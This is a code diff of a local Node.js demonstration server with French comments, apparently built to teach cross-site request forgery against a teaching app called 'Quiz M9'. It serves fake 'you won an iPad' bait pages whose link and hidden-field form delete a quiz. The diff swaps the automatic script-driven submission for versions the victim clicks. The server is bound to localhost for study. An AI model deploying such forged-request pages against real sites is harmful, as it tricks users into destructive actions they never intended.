@@ -6,8 +6,8 @@
  *
  * puis ouvrir, dans le navigateur connecté à Quiz M9 :
  *
- *   http://127.0.0.1:8080/             un lien suivi tout seul (GET)
- *   http://127.0.0.1:8080/formulaire   un formulaire envoyé tout seul (POST)
+ *   http://127.0.0.1:8080/bouton       un lien que la victime clique (GET)
+ *   http://127.0.0.1:8080/formulaire   un formulaire que la victime envoie (POST)
  *
  * 127.0.0.1 et localhost sont deux SITES différents pour le navigateur.
  * Essayez aussi http://localhost:8080/ : même site que localhost:5173, le
@@ -23,21 +23,18 @@ if (!Number.isInteger(quizId)) {
 const QUIZ_M9 = process.env.QUIZ_M9 ?? 'http://localhost:5173';
 
 const pages = {
-  '/': `
+  '/bouton': `
     <h1>Vous avez gagné un iPad !</h1>
-    <p>Redirection vers votre prix…</p>
-    <script>
-      setTimeout(() => { location.href = '${QUIZ_M9}/api/quizzes/${quizId}/delete'; }, 1500);
-    </script>`,
+    <p>Cliquez pour recevoir votre prix :</p>
+    <a href="${QUIZ_M9}/api/quizzes/${quizId}/delete">Réclamez votre prix</a>`,
   '/formulaire': `
     <h1>Vous avez gagné un iPad !</h1>
-    <form id="piege" method="post" action="${QUIZ_M9}/quizzes">
+    <p>Cliquez pour recevoir votre prix :</p>
+    <form method="post" action="${QUIZ_M9}/quizzes">
       <input type="hidden" name="intent" value="delete" />
       <input type="hidden" name="quizId" value="${quizId}" />
-    </form>
-    <script>
-      setTimeout(() => document.getElementById('piege').submit(), 1500);
-    </script>`,
+      <button type="submit">Réclamez votre prix</button>
+    </form>`,
 };
 
 function handler(req, res) {
@@ -53,4 +50,4 @@ function handler(req, res) {
 // Seulement sur ce poste : 127.0.0.1 (IPv4) et ::1 (IPv6, où localhost mène souvent).
 createServer(handler).listen(8080, '127.0.0.1');
 createServer(handler).listen(8080, '::1');
-console.log(`Site piégé : http://127.0.0.1:8080/ et /formulaire (questionnaire ${quizId})`);
+console.log(`Site piégé : http://127.0.0.1:8080/bouton et /formulaire (questionnaire ${quizId})`);
